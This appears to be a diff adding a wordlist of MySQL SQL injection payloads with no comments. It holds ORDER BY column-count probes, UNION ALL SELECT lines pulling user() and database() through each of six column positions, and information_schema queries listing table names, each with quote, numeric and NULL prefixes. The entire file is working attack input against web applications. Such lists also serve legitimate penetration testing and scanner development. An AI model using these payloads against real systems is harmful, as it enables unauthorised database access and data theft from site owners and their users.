@@ -1,0 +1,73 @@
+' ORDER BY 1#
+' ORDER BY 2#
+' ORDER BY 3#
+' ORDER BY 4#
+' ORDER BY 5#
+' ORDER BY 6#
+' ORDER BY 7#
+' ORDER BY 8#
+' ORDER BY 9#
+' ORDER BY 10#
+9999 ORDER BY 1#
+9999 ORDER BY 2#
+9999 ORDER BY 3#
+9999 ORDER BY 4#
+9999 ORDER BY 5#
+9999 ORDER BY 6#
+9999 ORDER BY 7#
+9999 ORDER BY 8#
+9999 ORDER BY 9#
+9999 ORDER BY 10#
+NULL' ORDER BY 1#
+NULL' ORDER BY 2#
+NULL' ORDER BY 3#
+NULL' ORDER BY 4#
+NULL' ORDER BY 5#
+NULL' ORDER BY 6#
+NULL' ORDER BY 7#
+NULL' ORDER BY 8#
+NULL' ORDER BY 9#
+NULL' ORDER BY 10#
+
+
+' UNION ALL SELECT user(), 2, 3, 4, 5, 6#
+' UNION ALL SELECT 1, user(), 3, 4, 5, 6#
+' UNION ALL SELECT 1, 2, user(), 4, 5, 6#
+' UNION ALL SELECT 1, 2, 3, user(), 5, 6#
+' UNION ALL SELECT 1, 2, 3, 4, user(), 6#
+' UNION ALL SELECT 1, 2, 3, 4, 5, user()#
+9999 UNION ALL SELECT user(), 2, 3, 4, 5, 6#
+9999 UNION ALL SELECT 1, user(), 3, 4, 5, 6#
+9999 UNION ALL SELECT 1, 2, user(), 4, 5, 6#
+9999 UNION ALL SELECT 1, 2, 3, user(), 5, 6#
+9999 UNION ALL SELECT 1, 2, 3, 4, user(), 6#
+9999 UNION ALL SELECT 1, 2, 3, 4, 5, user()#
+NULL' UNION ALL SELECT user(), 2, 3, 4, 5, 6#
+NULL' UNION ALL SELECT 1, user(), 3, 4, 5, 6#
+NULL' UNION ALL SELECT 1, 2, user(), 4, 5, 6#
+NULL' UNION ALL SELECT 1, 2, 3, user(), 5, 6#
+NULL' UNION ALL SELECT 1, 2, 3, 4, user(), 6#
+NULL' UNION ALL SELECT 1, 2, 3, 4, 5, user()#
+
+' UNION ALL SELECT database(), 2, 3, 4, 5, 6#
+' UNION ALL SELECT 1, database(), 3, 4, 5, 6#
+' UNION ALL SELECT 1, 2, database(), 4, 5, 6#
+' UNION ALL SELECT 1, 2, 3, database(), 5, 6#
+' UNION ALL SELECT 1, 2, 3, 4, database(), 6#
+' UNION ALL SELECT 1, 2, 3, 4, 5, database()#
+9999 UNION ALL SELECT database(), 2, 3, 4, 5, 6#
+9999 UNION ALL SELECT 1, database(), 3, 4, 5, 6#
+9999 UNION ALL SELECT 1, 2, database(), 4, 5, 6#
+9999 UNION ALL SELECT 1, 2, 3, database(), 5, 6#
+9999 UNION ALL SELECT 1, 2, 3, 4, database(), 6#
+9999 UNION ALL SELECT 1, 2, 3, 4, 5, database()#
+NULL' UNION ALL SELECT database(), 2, 3, 4, 5, 6#
+NULL' UNION ALL SELECT 1, database(), 3, 4, 5, 6#
+NULL' UNION ALL SELECT 1, 2, database(), 4, 5, 6#
+NULL' UNION ALL SELECT 1, 2, 3, database(), 5, 6#
+NULL' UNION ALL SELECT 1, 2, 3, 4, database(), 6#
+NULL' UNION ALL SELECT 1, 2, 3, 4, 5, database()#
+
+' UNION ALL SELECT 1, table_name, 3, 4, 5, 6 from information_schema.tables where table_schema='$DATABASE'#
+NULL' UNION ALL SELECT 1, table_name, 3, 4, 5, 6 from information_schema.tables where table_schema='$DATABASE'#
+9999 UNION ALL SELECT 1, table_name, 3, 4, 5, 6 from information_schema.tables where table_schema='$DATABASE'#
